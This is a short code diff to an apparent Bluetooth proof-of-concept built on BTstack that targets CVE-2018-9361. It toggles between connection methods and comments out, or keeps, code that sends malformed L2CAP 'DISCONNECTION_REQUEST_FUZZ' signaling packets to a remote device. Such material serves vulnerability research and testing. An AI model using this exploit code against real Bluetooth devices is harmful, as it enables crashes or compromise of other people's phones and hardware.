@@ -120,8 +120,8 @@ static void l2cap_packet_handler(uint8_t packet_type, uint16_t l2cap_cid, uint8_
 
 static void do_l2cap_connect(int psm) {
     uint8_t status;
-    //status = l2cap_create_channel(l2cap_packet_handler, remote_addr, psm, l2cap_max_mtu(), NULL);
-    status = gap_connect(remote_addr, 0);
+    status = l2cap_create_channel(l2cap_packet_handler, remote_addr, psm, l2cap_max_mtu(), NULL);
+    //status = gap_connect(remote_addr, 0);
     printf("Status: %d\n", status);
 }
 
@@ -150,8 +150,7 @@ static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *pack
                 // l2cap.c:l2cap_create_channel_entry -> hci_send_cmd(&hci_create_connection, channel->address, hci_usable_acl_packet_types(), 0, 0, 0, 1)
                 // Need to hook into l2cap send loop
                 // CVE-2018-9361
-                // do_l2cap_connect(BLUETOOTH_PROTOCOL_SDP);
-
+                //do_l2cap_connect(BLUETOOTH_PROTOCOL_SDP);
                 do_l2cap_connect(BLUETOOTH_PROTOCOL_AVCTP);
             }
             break;
@@ -159,8 +158,8 @@ static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *pack
             handle = hci_event_connection_complete_get_connection_handle(packet);
             printf("Connection complete (handle: %d)\n", handle);
             // CVE-2018-9361
-            l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
-                l2cap_next_sig_id());
+            //l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
+            //    l2cap_next_sig_id());
         case HCI_EVENT_LE_META:
             handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
             l2cap_send_le_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
